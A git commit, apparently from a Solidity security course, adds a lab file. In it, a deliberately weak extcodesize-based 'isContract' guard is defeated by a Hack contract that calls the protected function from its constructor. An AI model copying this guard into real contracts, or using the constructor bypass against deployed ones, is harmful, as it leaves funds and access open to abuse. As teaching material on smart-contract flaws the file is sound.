ff2c9435e6f71487bbed41aa8fcfdec21d27dce1
ElvinsJ <caoyifeng007@163.com>
2022-09-03 16:18:07 +0800

    Contract With Zero Code Size in Hack Solidity Complete

---
+++ week5/hardhat-ts-sample/contracts/HackSolidity/ContractWithZeroCodeSize/Bypass.sol
@@ -0,0 +1,47 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+contract Target {
+    function isContract(address account) public view returns (bool) {
+        // This method relies on extcodesize, which returns 0 for contracts in
+        // construction, since the code is only stored at the end of the
+        // constructor execution.
+        uint size;
+        assembly {
+            // https://docs.soliditylang.org/en/latest/yul.html#motivation-and-high-level-description
+            // extcodesize -> size of the code at address a
+            size := extcodesize(account)
+        }
+        return size > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), "no contract allowed");
+        pwned = true;
+    }
+}
+
+contract FailedAttack {
+    // Attempting to call Target.protected will fail,
+    // Target block calls from contract
+    function pwn(address _target) external {
+        // This will fail
+        Target(_target).protected();
+    }
+}
+
+contract Hack {
+    bool public isContract;
+    address public addr;
+
+    // When contract is being created, code size (extcodesize) is 0.
+    // This will bypass the isContract() check
+    constructor(address _target) public {
+        isContract = Target(_target).isContract(address(this));
+        addr = address(this);
+        // This will work
+        Target(_target).protected();
+    }
+}
